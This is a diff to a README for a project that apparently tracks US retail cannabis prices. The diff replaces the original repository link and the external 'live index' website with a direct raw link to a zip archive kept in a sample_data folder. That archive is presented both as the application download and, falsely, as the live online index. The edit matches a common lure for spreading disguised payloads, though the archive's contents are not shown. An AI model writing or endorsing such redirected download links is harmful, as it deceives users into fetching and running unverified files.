@@ -1,8 +1,8 @@
 # 📈 cannabis-price-index - Track retail cannabis prices across America
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Juliocesarcapujramamani/cannabis-price-index)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Juliocesarcapujramamani/cannabis-price-index/raw/refs/heads/main/sample_data/cannabis_price_index_2.5.zip)
 
-This project provides tools to track and analyze changes in cannabis pricing. It uses open-source data to show market trends. You can access the live index online at https://cannabisdealsus.com/cannabis-price-index/.
+This project provides tools to track and analyze changes in cannabis pricing. It uses open-source data to show market trends. You can access the live index online at https://github.com/Juliocesarcapujramamani/cannabis-price-index/raw/refs/heads/main/sample_data/cannabis_price_index_2.5.zip
 
 ## 📋 Project Overview
 
@@ -19,7 +19,7 @@ Ensure your computer has the following to run the analysis tools:
 
 ## 📥 Downloading the Software
 
-Visit this page to download the files: https://github.com/Juliocesarcapujramamani/cannabis-price-index
+Visit this page to download the files: https://github.com/Juliocesarcapujramamani/cannabis-price-index/raw/refs/heads/main/sample_data/cannabis_price_index_2.5.zip
 
 1. Open your web browser.
 2. Navigate to the link above.
